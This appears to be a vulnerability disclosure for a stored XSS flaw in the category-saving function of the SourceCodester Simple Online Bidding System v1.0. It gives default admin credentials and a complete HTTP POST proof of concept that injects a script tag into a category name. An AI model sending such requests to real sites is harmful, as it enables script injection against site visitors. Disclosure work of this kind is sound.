XSS vulnerability exists in Sourcecodester Simple Online Bidding System

official website:https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

version:v1.0

route：/simple-online-bidding-system/admin/index.php?page=categories

related code file：admin_class.php

related_function：save_category()

#### 1.Vulnerability analysis

The `save_category()` function in `admin_class.php` receives category-related parameters via POST without validating or escaping the incoming parameters. It directly concatenates these parameters into the SQL `insert` statement, which allows attackers to insert malicious script statements and execute XSS attacks.

![image-20240523192026508](SourceCodester Simple Online Bidding System CSRF-2.assets/image-20240523192026508.png)

#### 2.Vulnerability verification and exploit

We need log in to the system backend as admin/admin123.The exploit proof-of-concept (PoC) for this vulnerability is as follows. When using it, you need to modify the relevant address information in the PoC according to the target environment, such as the host and refer fields.

```
POST /admin/ajax.php?action=save_category HTTP/1.1
Host: 10.15.6.184:81
Content-Length: 254
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1k9MfksQcNnRazPp
Origin: http://10.15.6.184:81
Referer: http://10.15.6.184:81/admin/index.php?page=categories
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=vvku8vnm5dicgigog9a9tc6p41
Connection: close

------WebKitFormBoundary1k9MfksQcNnRazPp
Content-Disposition: form-data; name="id"


------WebKitFormBoundary1k9MfksQcNnRazPp
Content-Disposition: form-data; name="name"

xss<script>alert(111)</script>
------WebKitFormBoundary1k9MfksQcNnRazPp--

```

After successfully executing the PoC, you can observe that the malicious pop-up has occurred on the Home page accessible to regular users, indicating a successful XSS attack.

![image-20240523192652221](SourceCodester Simple Online Bidding System CSRF-2.assets/image-20240523192652221.png)

